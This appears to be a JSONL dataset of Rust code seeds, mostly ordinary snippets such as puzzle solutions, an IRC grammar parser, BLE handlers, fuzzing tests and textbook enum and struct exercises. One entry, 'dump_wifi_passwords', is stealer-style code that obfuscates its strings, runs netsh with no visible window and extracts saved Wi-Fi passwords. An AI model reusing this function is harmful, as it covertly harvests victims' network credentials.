{"seed":"fn main() {\n    let file_name = \"input.txt\";\n    let instructions = parse_file(file_name);\n    let (registers, largest_value) = process_instructions(&instructions);\n    println!(\"Day 8, part 1: {}\", get_largest_register_value(&registers));\n    println!(\"Day 8, part 2: {}\", largest_value);\n}","id":211}
{"seed":"pub fn test_memory_load_bytes() {\n    let mut rng = thread_rng();\n\n    assert_memory_load_bytes_all(&mut rng, RISCV_MAX_MEMORY, 1024 * 5, 0);\n    assert_memory_load_bytes_all(&mut rng, RISCV_MAX_MEMORY, 1024 * 5, 2);\n    assert_memory_load_bytes_all(&mut rng, RISCV_MAX_MEMORY, 1024 * 5, 1024 * 6);\n    assert_memory_load_bytes_all(&mut rng, RISCV_MAX_MEMORY, 0, 0);\n}","id":212}
{"seed":"fn read_dir<P: AsRef<Path>>(path: P, recursive: bool) -> io::Result<Vec<DirEntry>> {\n    let path = path.as_ref();\n    let mut entries = Vec::new();\n    for entry in fs::read_dir(path)? {\n        let entry = entry?;\n        let path = entry.path().to_str().unwrap().to_string();\n        let children = if recursive && entry.file_type()?.is_dir() {\n            Some(read_dir(&path, true)?)\n        } else {\n            None\n        };\n        entries.push(DirEntry { path, children });\n    }\n    Ok(entries)\n}","id":213}
{"seed":"fn map_prefix(tok: IRCToken) -> Result<IRCToken, ~str> {\n    match tok {\n        Sequence([Unparsed(nick), Sequence([rest])]) => match rest {\n            Sequence([Sequence([rest]), Unparsed(~\"@\"), Unparsed(host)]) => match rest {\n                Sequence([Unparsed(~\"!\"), Unparsed(user)]) => Ok(PrefixT(Prefix {nick: nick, user: user, host: host})),\n                _ => Ok(PrefixT(Prefix {nick: nick, user: ~\"\", host: host})),\n            },\n            _ => Ok(PrefixT(Prefix {nick: nick, user: ~\"\", host: ~\"\"})),\n        },\n        _ => Err(~\"Malformed prefix\")\n    }","id":214}
{"seed":"fn main() {\n    std::panic::set_hook(Box::new(console_error_panic_hook::hook));\n    console_log::init_with_level(log::Level::Warn).expect(\"could not initialize logger\");\n\n    let fighter_bytes = include_bytes!(\"subaction_data.bin\");\n    let subaction = bincode::deserialize(fighter_bytes).unwrap();\n    wasm_bindgen_futures::spawn_local(render_window_wasm(subaction));\n}","id":215}
{"seed":"fn main() {\n\tlet argv = os::args();\n\tlet size = from_str::<uint>(argv[1]).unwrap();\n\/\/\tprintln!(\"{}\",size);\n\n\tlet align = from_str::<uint>(argv[2]).unwrap();\n\/\/\tprintln!(\"{}\", align);\n\n\tlet aligned = align_to(size,align);\n\tprintln!(\"{} by {} = {}\", size, align, aligned);\n\n\/\/\tprint_uint(*argv[1]);\n}","id":216}
{"seed":"fn enum_test() {\n    \/\/ enum Ordering {\n    \/\/     Less,\n    \/\/     Equal,\n    \/\/     Greater \/ 2.0\n    \/\/ }\n\n    use std::cmp::Ordering;\n\n    fn compare(n: i32, m: i32) -> Ordering {\n        if n < m {\n            Ordering::Less\n        } else if n > m {\n            Ordering::Greater\n        } else {\n            Ordering::Equal\n        }\n    }\n    \/\/ use std::cmp::Ordering::*;\n\n    \/\/ fn compare(n: i32, m: i32) -> Ordering {\n    \/\/     if n < m {\n    \/\/         Less\n    \/\/     } else if n > m {\n    \/\/         Greater\n    \/\/     } else {\n    \/\/         Equal\n    \/\/     }\n    \/\/ }\n\n    \/\/ enum Pet {\n    \/\/     Orca,\n    \/\/     Giraffe,\n    \/\/ }\n\n    \/\/ use self::Pet::*;\n\n    #[derive(Debug, PartialEq)]\n    enum HttpStatus {\n        Ok = 200,\n        NotModified = 304,\n        NotFound = 404,\n    }\n\n    use std::mem::size_of;\n    assert_eq!(size_of::<Ordering>(), 1);\n    assert_eq!(size_of::<HttpStatus>(), 2); \/\/ 404 doesn't fit in a u8\n\n    assert_eq!(HttpStatus::Ok as i32, 200);\n\n    fn http_status_from_u32(n: u32) -> Option<HttpStatus> {\n        match n {\n            200 => Some(HttpStatus::Ok),\n            304 => Some(HttpStatus::NotModified),\n            404 => Some(HttpStatus::NotFound),\n            _ => None,\n        }\n    }\n\n    let status = http_status_from_u32(404).unwrap();\n    \/\/ assert_eq!(status as i32, 404);\n    assert_eq!(status, HttpStatus::NotFound);\n\n    #[derive(Copy, Clone, Debug, PartialEq)]\n    enum TimeUnit {\n        Seconds,\n        Minutes,\n        Hours,\n        Days,\n        Months,\n        Years,\n    }\n\n    impl TimeUnit {\n        \/\/\/ Return the plural noun for this time unit.\n        fn plural(self) -> &'static str {\n            match self {\n                TimeUnit::Seconds => \"seconds\",\n                TimeUnit::Minutes => \"minutes\",\n                TimeUnit::Hours => \"hours\",\n                TimeUnit::Days => \"days\",\n                TimeUnit::Months => \"months\",\n                TimeUnit::Years => \"years\",\n            }\n        }\n        \/\/\/ Return the singular noun for this time unit.\n        fn singular(self) -> &'static str {\n            self.plural().trim_right_matches('s')\n        }\n    }\n\n    \/\/\/ A timestamp that has been deliberately rounded off, so our program\n    \/\/\/ says \"6 monthes ago\" instead of \"February 9, 2016, at 9:49 AM\".\n    #[derive(Copy, Clone, Debug, PartialEq)]\n    enum RoughTime {\n        InThePast(TimeUnit, u32),\n        JustNow,\n        InTheFuture(TimeUnit, u32),\n    }\n\n    let four_score_and_seven_years_ago = RoughTime::InThePast(TimeUnit::Years, 4 * 20 + 7);\n\n    let three_hours_from_now = RoughTime::InTheFuture(TimeUnit::Hours, 3);\n\n    struct Point3d(u32, u32, u32);\n    enum Shape {\n        Sphere { center: Point3d, radius: f32 },\n        Cubold { corner1: Point3d, corner2: Point3d },\n    }\n\n    let unit_sphere = Shape::Sphere {\n        center: Point3d(0, 0, 0),\n        radius: 1.0,\n    };\n\n    \/\/ enum RelationshipStatus {\n    \/\/     Single,\n    \/\/     InARelationship,\n    \/\/     ItsComplicated(Option<String>),\n    \/\/     ItsExtremelyComplicated {\n    \/\/         car: DifferentialEquation,\n    \/\/         cdr: EarlyModernistPoem\n    \/\/     }\n    \/\/ }\n    \/\/\n\n    use std::collections::HashMap;\n    enum Json {\n        Null,\n        Boolean(bool),\n        Number(f64),\n        String(String),\n        Array(Vec<Json>),\n        Object(Box<HashMap<String, Json>>),\n    }\n\n    \/\/ An ordered collection of `T`s\n    enum BinaryTree<T> {\n        Empty,\n        NonEmpty(Box<TreeNode<T>>),\n    }\n\n    \/\/ A part of a BinaryTree.\n    struct TreeNode<T> {\n        element: T,\n        left: BinaryTree<T>,\n        right: BinaryTree<T>,\n    }\n\n    let jupiter_tree = BinaryTree::NonEmpty(Box::new(TreeNode {\n        element: \"Jupiter\",\n        left: BinaryTree::Empty,\n        right: BinaryTree::Empty,\n    }));\n    let mercury_tree = BinaryTree::NonEmpty(Box::new(TreeNode {\n        element: \"Mercury\",\n        left: BinaryTree::Empty,\n        right: BinaryTree::Empty,\n    }));\n    let uranus_tree = BinaryTree::NonEmpty(Box::new(TreeNode {\n        element: \"Uranus\",\n        left: BinaryTree::Empty,\n        right: BinaryTree::Empty,\n    }));\n    let mars_tree = BinaryTree::NonEmpty(Box::new(TreeNode {\n        element: \"Mars\",\n        left: jupiter_tree,\n        right: mercury_tree,\n    }));\n    let tree = BinaryTree::NonEmpty(Box::new(TreeNode {\n        element: \"Saturn\",\n        left: mars_tree,\n        right: uranus_tree,\n    }));\n\n    \/\/ let mut tree = BinaryTree::Empty;\n    \/\/ for planet in planets {\n    \/\/    tree.add(planet);\n    \/\/ }\n\n    \/\/ 10.2\n\n    fn rough_time_to_english(rt: RoughTime) -> String {\n        match rt {\n            RoughTime::InThePast(units, count) => format!(\"{}, {} ago\", count, units.plural()),\n            RoughTime::JustNow => format!(\"just now\"),\n            RoughTime::InTheFuture(units, 1) => format!(\"a {} from now\", units.plural()),\n            RoughTime::InTheFuture(units, count) => {\n                format!(\"{}, {} from now\", count, units.plural())\n            }\n        }\n    }\n\n    rough_time_to_english(four_score_and_seven_years_ago);\n\n    \/\/ 10.2.1\n\n    \/\/ match meadow.count_rabbits() {\n    \/\/     0 => {} \/\/ nothing to say\n    \/\/     1 => println!(\"A rabbit is nosing around inthe clover.\"),\n    \/\/     n => println!(\"There are {} rabbits hopping about in the meadow\", n)\n    \/\/ }\n    \/\/\n    \/\/ let calendar =\n    \/\/     match settings.get_string(\"calendar\") {\n    \/\/        \"gregorian\" => Calendar::Gregorian,\n    \/\/        \"chinese\" => Calendar::Chinese,\n    \/\/        \"ethiopian\" => Calendar::Ethiopian,\n    \/\/        other => return parse_error(\"calendar\", other)\n    \/\/     };\n    \/\/ let caption =\n    \/\/     match photo.tagged_pet() {\n    \/\/        Pet::Tyrannosaur => \"RRRRAAAAAHHHHH\",\n    \/\/        Pet::Samoyed => \"*dog thoughts*\",\n    \/\/        _ => \"I'm cute, love me\" \/\/ generic caption, works for any pet\n    \/\/     }\n    \/\/ \/\/ there are many Shapes, but we only support \"selecting\"\n    \/\/ \/\/ either some text, or everything in a rectangular area.\n    \/\/ \/\/ You can't select an ellipse or trapezoid.\n    \/\/ match document.selection() {\n    \/\/    Shape::TextSpan(start, end) => paint_text_selection(start, end),\n    \/\/    Shape::Rectangle(rect) => paint_rect_selection(rect),\n    \/\/    _ => panic!(\"unexpected selection type\")\n    \/\/ }\n    \/\/\n    \/\/ fn check_move(current_hex: Hex, click: Point) -> game::Result<Hex> {\n    \/\/    match point_to_hex(click) {\n    \/\/        None =>\n    \/\/            Err(\"That's not a game space.\"),\n    \/\/        Some(current_hex) => \/\/ try to match if user clicked the current_hex\n    \/\/                             \/\/ (if doesn't work)\n    \/\/            Err(\"You are already there! You must click somewhere else.\"),\n    \/\/        Some(other_hex) =>\n    \/\/            Ok(other_hex)\n    \/\/    }\n    \/\/ }\n    \/\/\n    \/\/ fn check_move(current_hex: Hex, click: Point) -> game::Result<Hex> {\n    \/\/    match point_to_hex(click) {\n    \/\/        None =>\n    \/\/            Err(\"That's not a game space.\"),\n    \/\/        Some(hex) =>\n    \/\/            if hex == current_hex {\n    \/\/                Err(\"You are already there! You must click somewhere else.\"),\n    \/\/            } else {\n    \/\/                Ok(hex)\n    \/\/            }\n    \/\/        Some(other_hex) =>\n    \/\/            Ok(other_hex)\n    \/\/    }\n    \/\/ }\n    \/\/\n    \/\/ fn describe_point(x: i32, y: i32) -> &'static str {\n    \/\/     use std::cmp::Ordering::*;\n    \/\/     match (x.cmp(&0), y.cmp(&0) {\n    \/\/         (Equal, Equal) -> \"at the origin\",\n    \/\/         (_, Equal) => \"on the x axis\",\n    \/\/         (Equal, _) => \"on the y axis\",\n    \/\/         (Greater, Greater) => \"in the first quadrant\",\n    \/\/         (Less, Grater) => \"in the second quadrant\",\n    \/\/         _ => \"somewhere else\"\n    \/\/     }\n    \/\/ }\n    \/\/\n    \/\/ match balloon.location {\n    \/\/     Point { x: 0, y: height } =>\n    \/\/        println!(\"straight up {} meters\", height),\n    \/\/     Point { x: x, y: y } =>\n    \/\/        println!(\"at ({}m, {}m)\", x, y);\n    \/\/ }\n    \/\/\n    \/\/ match get_acount(id) {\n    \/\/    Some(Account { name, language, .. {) =>\n    \/\/        language.show_custom_greeting(name)\n    \/\/ }\n    \/\/\n    \/\/ 10.2.3\n    \/\/\n    \/\/ match account {\n    \/\/    Account { name, language, .. } => {\n    \/\/        ui.greet(&name, &language);\n    \/\/        ui.show_settigs(&account); \/\/ error: use of moved value `account`\n    \/\/    }\n    \/\/ }\n    \/\/ match account {\n    \/\/   Account { ref name, ref language, .. } => {\n    \/\/        ui.greet(name, language);\n    \/\/        ui.show_settings(&account); \/\/ ok\n    \/\/   }\n    \/\/ }\n    \/\/\n    \/\/ match line_result {\n    \/\/     Err(ref err) => log_error(err), \/\/ `err` is &Error (shared ref)\n    \/\/     Ok(ref mut line) -> {           \/\/ `line` is &mut String (mut ref)\n    \/\/         trim_comments(line);        \/\/ modify the String in place\n    \/\/         handle(line);\n    \/\/     }\n    \/\/ }\n    \/\/\n    \/\/ match sphere.center() {\n    \/\/     &Point3d { x, y, z } => ...\n    \/\/ }\n    \/\/\n    \/\/ match friend.borrow_car() {\n    \/\/     Some(&Car { engine, .. }) => \/\/ error: can't move out of borrow\n    \/\/     ...\n    \/\/     None -> {}\n    \/\/ }\n    \/\/\n    \/\/ Some(&Car {ref engine, .. }) => \/\/ ok, engine is a reference\n    \/\/\n    \/\/ match chars.peek() {\n    \/\/     Some(&c) -> println!(\"coming up: {:?}\", c),\n    \/\/     None =-> println!(\"end of chars\")\n    \/\/ }\n    \/\/\n    \/\/ 10.2.4\n    \/\/\n    \/\/ let at_end =\n    \/\/     match chars.peek() {\n    \/\/         Some(&'\\r') | Some(&'\\n') | None => true,\n    \/\/         _ => false\n    \/\/     };\n    \/\/ match next_char {\n    \/\/     '0' ... '9' =>\n    \/\/         self.read_number(),\n    \/\/     'a' ... 'z' | 'A' ... 'Z' =>\n    \/\/         self.read_word(),\n    \/\/     ' ' | '\\t' | '\\n' =>\n    \/\/         self.skip_whitespace(),\n    \/\/     _ =>\n    \/\/         self.handle_punctuation()\n    \/\/ }\n    \/\/\n    \/\/ 10.2.5\n    \/\/\n    \/\/ match robot.last_known_location() {\n    \/\/     Some(point) if self.distance_to(point) < 10 =>\n    \/\/         short_distance_strategy(point),\n    \/\/     Some(point) ->\n    \/\/         long_distance_strategy(point),\n    \/\/     None ->\n    \/\/         searching_strategy()\n    \/\/ }\n    \/\/\n    \/\/ 10.2.6\n    \/\/\n    \/\/ match self.get_selection() {\n    \/\/     Shape::Rect(top_left, bottom_right) ->\n    \/\/         optimized_paint(&Shape::Rect(top_left, bottom_right)),\n    \/\/     other_shape =>\n    \/\/         paint_outline(other_shape.get_outline()),\n    \/\/ }\n    \/\/\n    \/\/ rect @ Shape::Rect(..) -> optimized_paint(&rect)\n    \/\/\n    \/\/ match chars.next() {\n    \/\/     Some(digit @ '0' ... '9') => read_number(disit, chars),\n    \/\/ }\n    \/\/\n    \/\/ 10.2.7\n    \/\/\n    \/\/ \/\/ ...unpack a struct into three new local variables\n    \/\/ let Track { album, track_number, title, ..} = song;\n    \/\/\n    \/\/ \/\/ ...unpack a function argument that's a tuple\n    \/\/ fn distance_to((x,y): (f64, f64)) -> f64 { ... }\n    \/\/\n    \/\/ \/\/ ...iterate over keys and values of a HashMap\n    \/\/ for (id, document) in &cache_map {\n    \/\/    println!(\"Document #{}: {}\", id, document.title);\n    \/\/ }\n    \/\/\n    \/\/ \/\/ ...automatically dereference an argument to a closure\n    \/\/ \/\/ (handy because sometimes other code passes you a reference\n    \/\/ \/\/ when you'd rather have a copy)\n    \/\/ let sum = numbers.fold(0, |a, &num| a + num);\n    \/\/\n    \/\/ \/\/ ...handle just one enum variant specially\n    \/\/ if let RoughTime::InTheFuture(_, _) = user.date_of_birth() {\n    \/\/     user.set_time_traveler(true);\n    \/\/ }\n    \/\/\n    \/\/ \/\/ ...run some code only if a table lookup succeeds\n    \/\/ if let Some(document) = cache_map.get(&id) {\n    \/\/     return send_cached_response(document);\n    \/\/ }\n    \/\/\n    \/\/ \/\/ ...repeatedly try something until it succeeds\n    \/\/ while let Err(err) = present_cheesy_anti_robot_task() {\n    \/\/     log_robot_attempt(err);\n    \/\/     \/\/ let the user try again (it might still be a human)\n    \/\/ }\n    \/\/\n    \/\/ \/\/ ...manually loop over an iterator\n    \/\/ while let Some(_) = lines.peek() {\n    \/\/     read_paragraph(&mut lines);\n    \/\/ }\n    \/\/\n    \/\/ 10.2.8\n\n    impl<T: Ord> BinaryTree<T> {\n        fn add(&mut self, value: T) {\n            match *self {\n                BinaryTree::Empty => {\n                    *self = BinaryTree::NonEmpty(Box::new(TreeNode {\n                        element: value,\n                        left: BinaryTree::Empty,\n                        right: BinaryTree::Empty,\n                    }))\n                }\n                BinaryTree::NonEmpty(ref mut node) => {\n                    if value <= node.element {\n                        node.left.add(value);\n                    } else {\n                        node.right.add(value);\n                    }\n                }\n            }\n        }\n    }\n\n    let mut add_tree = BinaryTree::Empty;\n    add_tree.add(\"Mercury\");\n    add_tree.add(\"Venus\");\n}","id":217}
{"seed":"extern \"C\" fn gatt_svr_chr_access_heart_rate(\n    _conn_handle: u16,\n    _attr_handle: u16,\n    ctxt: *mut ble_gatt_access_ctxt,\n    _arg: *mut ::core::ffi::c_void,\n) -> i32 {\n    \/* Sensor location, set to \"Chest\" *\/\n    const BODY_SENS_LOC: u8 = 0x01;\n\n    let uuid: u16 = unsafe { ble_uuid_u16((*(*ctxt).__bindgen_anon_1.chr).uuid) };\n\n    if uuid == GATT_HRS_BODY_SENSOR_LOC_UUID {\n        let rc: i32 = unsafe {\n            os_mbuf_append(\n                (*ctxt).om,\n                &BODY_SENS_LOC as *const u8 as *const c_void,\n                size_of::<u8>() as u16,\n            )\n        };\n\n        return if rc == 0 {\n            0\n        } else {\n            BLE_ATT_ERR_INSUFFICIENT_RES as i32\n        };\n    }\n\n    return BLE_ATT_ERR_UNLIKELY as i32;\n}","id":218}
{"seed":"fn run_no_crash() {\n    let project = project(\"run_no_crash\")\n        .with_fuzz()\n        .fuzz_target(\n            \"no_crash\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    #[cfg(fuzzing_repro)]\n                    eprintln!(\"Reproducing a crash\");\n\n                    run_no_crash::pass_fuzzing(data);\n                });\n            \"#,\n        )\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"no_crash\")\n        .arg(\"--\")\n        .arg(\"-runs=1000\")\n        .assert()\n        .stderr(\n            predicate::str::contains(\"Done 1000 runs\")\n                .and(predicate::str::contains(\"Reproducing a crash\").not()),\n        )\n        .success();\n}","id":219}
{"seed":"fn debug_fmt() {\n    let corpus = Path::new(\"fuzz\").join(\"corpus\").join(\"debugfmt\");\n    let project = project(\"debugfmt\")\n        .with_fuzz()\n        .fuzz_target(\n            \"debugfmt\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n                use libfuzzer_sys::arbitrary::{Arbitrary, Unstructured, Result};\n\n                #[derive(Debug)]\n                pub struct Rgb {\n                    r: u8,\n                    g: u8,\n                    b: u8,\n                }\n\n                impl<'a> Arbitrary<'a> for Rgb {\n                    fn arbitrary(raw: &mut Unstructured<'a>) -> Result<Self> {\n                        let mut buf = [0; 3];\n                        raw.fill_buffer(&mut buf)?;\n                        let r = buf[0];\n                        let g = buf[1];\n                        let b = buf[2];\n                        Ok(Rgb { r, g, b })\n                    }\n                }\n\n                fuzz_target!(|data: Rgb| {\n                    let _ = data;\n                });\n            \"#,\n        )\n        .file(corpus.join(\"0\"), \"111\")\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"fmt\")\n        .arg(\"debugfmt\")\n        .arg(\"fuzz\/corpus\/debugfmt\/0\")\n        .assert()\n        .stderr(predicates::str::contains(\n            \"\nRgb {\n    r: 49,\n    g: 49,\n    b: 49,\n}\",\n        ))\n        .success();\n}","id":220}
{"seed":"fn main() {\n    env_logger::init().unwrap_or_else(\n        |err|\n            panic!(\"unable to initiate env logger: {}\", err)\n    );\n\n    match core::start() {\n        Ok(()) => info!(\"game exiting\"),\n        Err(err) => error!(\"core start error: {}\", err),\n    }\n}","id":221}
{"seed":"pub async fn dump_wifi_passwords() -> Option<WifiLogins> {\n    let output = Command::new(obfstr::obfstr!(\"netsh.exe\"))\n        .args(&[\n            obfstr::obfstr!(\"wlan\"),\n            obfstr::obfstr!(\"show\"),\n            obfstr::obfstr!(\"profile\"),\n        ])\n        .creation_flags(CREATE_NO_WINDOW)\n        .output()\n        .ok()?;\n\n    let mut wifi_logins = WifiLogins::new();\n\n    let list_of_process = String::from_utf8_lossy(&output.stdout);\n    for line in list_of_process.lines() {\n        if line\n            .to_lowercase()\n            .contains(obfstr::obfstr!(\"all user profile\"))\n            && line.contains(\":\")\n        {\n            let ssid = line.split(':').nth(1)?.trim();\n            let profile = get_wifi_profile(ssid).await?;\n            for pline in profile.lines() {\n                if pline\n                    .to_lowercase()\n                    .contains(obfstr::obfstr!(\"key content\"))\n                    && pline.contains(\":\")\n                {\n                    let key = pline.split(\": \").nth(1)?;\n                    wifi_logins.insert(ssid.to_string(), key.to_string());\n                }\n            }\n        }\n    }\n\n    Some(wifi_logins)\n}","id":222}
{"seed":"pub fn grammar() -> ParseContext<IRCToken> {\n    let mut ctx = ParseContext::new();\n    \/*\n    message    =  [ \":\" prefix SPACE ] command [ params ] crlf\n    prefix     =  servername \/ ( nickname [ [ \"!\" user ] \"@\" host ] )\n    command    =  1*letter \/ 3digit\n    params     =  *14( SPACE middle ) [ SPACE \":\" trailing ]\n               =\/ 14( SPACE middle ) [ SPACE [ \":\" ] trailing ]\n\n    nospcrlfcl =  %x01-09 \/ %x0B-0C \/ %x0E-1F \/ %x21-39 \/ %x3B-FF\n                    ; any octet except NUL, CR, LF, \" \" and \":\"\n    middle     =  nospcrlfcl *( \":\" \/ nospcrlfcl )\n    trailing   =  *( \":\" \/ \" \" \/ nospcrlfcl )\n\n    SPACE      =  %x20        ; space character\n    crlf       =  %x0D %x0A   ; \"carriage return\" \"linefeed\" \n    *\/\n    ctx.rule(\"message\", ~Map(~LessThan(1, ~Literal(\":\") * ~Rule(\"prefix\") * ~Rule(\"SPACE\")) * ~Rule(\"command\") * ~LessThan(1, ~Rule(\"params\")), map_message));\n    ctx.rule(\"prefix\", ~Map(~Rule(\"nickname\") * ~LessThan(1, ~LessThan(1, ~Literal(\"!\") * ~Rule(\"user\")) * ~Literal(\"@\") * ~Rule(\"host\")), map_prefix) + ~Build(~Rule(\"servername\"), build_serverprefix));\n    ctx.rule(\"command\", ~Build(~MoreThan(1, ~Rule(\"letter\")) + ~Exactly(3, ~Rule(\"digit\")), build_unparsed));\n    ctx.rule(\"params\", ~Map(~More(~Rule(\"SPACE\") * ~Rule(\"middle\")) * ~LessThan(1, ~Rule(\"SPACE\") * ~Literal(\":\") * ~Rule(\"trailing\"))\n                          + ~More(~Rule(\"SPACE\") * ~Rule(\"middle\")) * ~LessThan(1, ~Rule(\"SPACE\") * ~LessThan(1, ~Literal(\":\")) * ~Rule(\"trailing\")), map_params));\n    ctx.rule(\"nospcrlfcl\", ~Diff(~Chars(1), ~Set(\"\\x00\\r\\n :\".iter().collect())));\n    ctx.rule(\"middle\", ~Build(~Rule(\"nospcrlfcl\") * ~More(~Literal(\":\") + ~Rule(\"nospcrlfcl\")), build_unparsed));\n    ctx.rule(\"trailing\", ~Build(~More(~Literal(\":\") + ~Literal(\" \") + ~Rule(\"nospcrlfcl\")), build_unparsed));\n    ctx.rule(\"SPACE\", ~Map(~Literal(\" \"), map_ignored));\n    ctx.rule(\"crlf\", ~Literal(\"\\r\\n\"));\n    \/*\n    target     =  nickname \/ server\n    msgtarget  =  msgto *( \",\" msgto )\n    msgto      =  channel \/ ( user [ \"%\" host ] \"@\" servername )\n    msgto      =\/ ( user \"%\" host ) \/ targetmask\n    msgto      =\/ nickname \/ ( nickname \"!\" user \"@\" host )\n    channel    =  ( \"#\" \/ \"+\" \/ ( \"!\" channelid ) \/ \"&\" ) chanstring\n                [ \":\" chanstring ]\n    servername =  hostname\n    host       =  hostname \/ hostaddr\n    hostname   =  shortname *( \".\" shortname )\n    shortname  =  ( letter \/ digit ) *( letter \/ digit \/ \"-\" )\n                *( letter \/ digit )\n                  ; as specified in RFC 1123 [HNAME]\n    hostaddr   =  ip4addr \/ ip6addr\n    ip4addr    =  1*3digit \".\" 1*3digit \".\" 1*3digit \".\" 1*3digit\n    ip6addr    =  1*hexdigit 7( \":\" 1*hexdigit )\n    ip6addr    =\/ \"0:0:0:0:0:\" ( \"0\" \/ \"FFFF\" ) \":\" ip4addr\n    nickname   =  ( letter \/ special ) *8( letter \/ digit \/ special \/ \"-\" )\n    targetmask =  ( \"$\" \/ \"#\" ) mask\n                  ; see details on allowed masks in section 3.3.1\n    chanstring =  %x01-07 \/ %x08-09 \/ %x0B-0C \/ %x0E-1F \/ %x21-2B\n    chanstring =\/ %x2D-39 \/ %x3B-FF\n                  ; any octet except NUL, BELL, CR, LF, \" \", \",\" and \":\"\n    channelid  = 5( %x41-5A \/ digit )   ; 5( A-Z \/ 0-9 )\n    *\/\n    ctx.rule(\"servername\", ~Rule(\"hostname\"));\n    ctx.rule(\"host\", ~Build(~Rule(\"hostname\") + ~Rule(\"hostaddr\"), build_unparsed));\n    ctx.rule(\"hostname\", ~Rule(\"shortname\") * ~More(~Literal(\".\") * ~Rule(\"shortname\")));\n    ctx.rule(\"shortname\", (~Rule(\"letter\") + ~Rule(\"digit\")) * ~More(~Rule(\"letter\") + ~Rule(\"digit\") + ~Literal(\"-\")));\n    ctx.rule(\"hostaddr\", ~Rule(\"ip4addr\") + ~Rule(\"ip6addr\"));\n    ctx.rule(\"ip4addr\", ~Exactly(3, ~Rule(\"digit\")) * ~Exactly(3, ~Exactly(3, ~Literal(\".\") * ~Rule(\"digit\"))));\n    ctx.rule(\"ip6addr\", ~Rule(\"hexdigit\") * ~Exactly(7, ~Literal(\":\") * ~Rule(\"hexdigit\"))\n                      + ~Literal(\"0:0:0:0:0:\") * (~Literal(\"0\") + ~Literal(\"FFFF\")) * ~Literal(\":\") * ~Rule(\"ip4addr\"));\n    ctx.rule(\"nickname\", ~Build((~Rule(\"letter\") + ~Rule(\"special\")) * ~More(~Rule(\"letter\") + ~Rule(\"digit\") + ~Rule(\"special\") + ~Literal(\"-\")), build_unparsed));\n    \/*\n    user       =  1*( %x01-09 \/ %x0B-0C \/ %x0E-1F \/ %x21-3F \/ %x41-FF )\n                    ; any octet except NUL, CR, LF, \" \" and \"@\"\n    key        =  1*23( %x01-05 \/ %x07-08 \/ %x0C \/ %x0E-1F \/ %x21-7F )\n                      ; any 7-bit US_ASCII character,\n                      ; except NUL, CR, LF, FF, h\/v TABs, and \" \"\n    letter     =  %x41-5A \/ %x61-7A       ; A-Z \/ a-z\n    digit      =  %x30-39                 ; 0-9\n    hexdigit   =  digit \/ \"A\" \/ \"B\" \/ \"C\" \/ \"D\" \/ \"E\" \/ \"F\"\n    special    =  %x5B-60 \/ %x7B-7D\n                       ; \"[\", \"]\", \"\\\", \"`\", \"_\", \"^\", \"{\", \"|\", \"}\"\n    *\/\n    ctx.rule(\"user\", ~Build(~MoreThan(1, ~Diff(~Chars(1), ~Set(\"\\x00\\r\\n @\".iter().collect()))), build_unparsed));\n    ctx.rule(\"letter\", ~Range('a','z') + ~Range('A','Z'));\n    ctx.rule(\"digit\", ~Range('0','9'));\n    ctx.rule(\"hexdigit\", ~Rule(\"digit\") + ~Range('A','F'));\n    ctx.rule(\"special\", ~Set(\"[]\\\\`_^{|}\".iter().collect()));\n\n    ctx\n}","id":223}
{"seed":"pub fn threaded_quick_sort<T: 'static + PartialOrd + Debug + Send>(v: &mut [T]) {\n    if v.len() <= 1 {\n        return;\n    }\n    let p = pivot(v);\n    println!(\"{:?}\", v);\n    let (a, b) = v.split_at_mut(p);\n    let raw_a = a as *mut [T];\n    let raw_s = RawSend(raw_a);\n    unsafe {\n        let handle = std::thread::spawn(move || {\n            threaded_quick_sort(&mut *raw_s.0);\n        });\n        threaded_quick_sort(&mut b[1..]);\n        \/\/ compiler doesn't know that we join these\n        \/\/ We do\n        handle.join().ok();\n    }\n}","id":224}
{"seed":"fn struct_test() {\n    \/\/ 9.1\n    \/\/\/ A rectangle of eight-bit grayscale pixels\n    struct GrayscaleMap {\n        pixels: Vec<u8>,\n        size: (usize, usize),\n    }\n\n    let width = 1024;\n    let height = 576;\n    \/\/ let image = GrayscaleMap {\n    \/\/     pixels: vec![0; width * height],\n    \/\/     size: (width, height),\n    \/\/ };\n\n    fn new_map(size: (usize, usize), pixels: Vec<u8>) -> GrayscaleMap {\n        assert_eq!(pixels.len(), size.0 * size.1);\n        GrayscaleMap { pixels, size }\n    }\n    let image = new_map((width, height), vec![0; width * height]);\n\n    assert_eq!(image.size, (1024, 576));\n    assert_eq!(image.pixels.len(), 1024 * 576);\n\n    \/\/ pub struct GrayscaleMap {\n    \/\/     pub pixels: Vec<u8>,\n    \/\/     pub size: (usize, usize)\n    \/\/ }\n\n    \/\/ pub struct GrayscaleMap {\n    \/\/     pixels: Vec<u8>,\n    \/\/     size: (usize, usize)\n    \/\/ }\n    \/\/\n\n    struct Broom {\n        name: String,\n        height: u32,\n        health: u32,\n        position: (f32, f32, f32),\n        intent: BroomIntent,\n    }\n\n    \/\/\/ Two possitble alternatives for what a ~Broom` could be working on.\n    #[derive(Copy, Clone)]\n    enum BroomIntent {\n        FetchWater,\n        DumpWater,\n    }\n\n    \/\/ Receive the input Broom by value, taking ownership.\n    fn chop(b: Broom) -> (Broom, Broom) {\n        \/\/ Initialize `broom1` mostly from `b`, changing only `height`, Since\n        \/\/ `String` is not `Copy`, `broom1` takes ownership of `b`'s name.\n        let mut broom1 = Broom {\n            height: b.height \/ 2,\n            ..b\n        };\n\n        \/\/ Initialize `broom2` mostly from `broom1`. Since `String` is not\n        \/\/ `Copy`, we must clone `name` explicitly.\n        let mut broom2 = Broom {\n            name: broom1.name.clone(),\n            ..broom1\n        };\n\n        broom1.name.push_str(\" I\");\n        broom2.name.push_str(\" II\");\n\n        (broom1, broom2)\n    }\n\n    let hokey = Broom {\n        name: \"Hokey\".to_string(),\n        height: 60,\n        health: 100,\n        position: (100.0, 200.0, 0.0),\n        intent: BroomIntent::FetchWater,\n    };\n\n    let (hokey1, hokey2) = chop(hokey);\n    assert_eq!(hokey1.name, \"Hokey I\");\n    assert_eq!(hokey1.health, 100);\n\n    assert_eq!(hokey2.name, \"Hokey II\");\n    assert_eq!(hokey2.health, 100);\n\n    \/\/ 9.2\n    struct Bounds(usize, usize);\n\n    let image_bounds = Bounds(1024, 768);\n    assert_eq!(image_bounds.0 * image_bounds.1, 786432);\n\n    \/\/ pub struct Bounds(pub usize, pub usize);\n\n   